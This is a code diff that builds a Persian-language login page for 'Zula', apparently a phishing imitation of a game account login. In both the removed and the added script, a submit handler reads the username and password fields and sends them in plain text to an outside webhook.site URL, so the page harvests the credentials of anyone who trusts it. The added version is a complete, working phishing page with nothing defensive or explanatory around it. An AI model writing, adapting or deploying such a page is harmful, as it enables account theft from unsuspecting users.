@@ -1,13 +1,64 @@
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const form = document.querySelector("form");
-    if (!form) return;
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>ورود به زولا</title>
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: white;
+      font-family: Tahoma, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: #1c1c1c;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #000;
+      width: 300px;
+    }
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #ffcc00;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>ورود به زولا</h2>
+    <form id="loginForm">
+      <input type="text" name="UserName" placeholder="نام کاربری" required />
+      <input type="password" name="Password" placeholder="رمز عبور" required />
+      <button type="submit">ورود</button>
+    </form>
+  </div>
 
-    form.addEventListener("submit", function () {
-      const username = document.querySelector("input[name='UserName']")?.value || "";
-      const password = document.querySelector("input[name='Password']")?.value || "";
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      const username = document.querySelector("input[name='UserName']").value;
+      const password = document.querySelector("input[name='Password']").value;
 
       fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
     });
-  });
-</script>
+  </script>
+</body>
+</html>
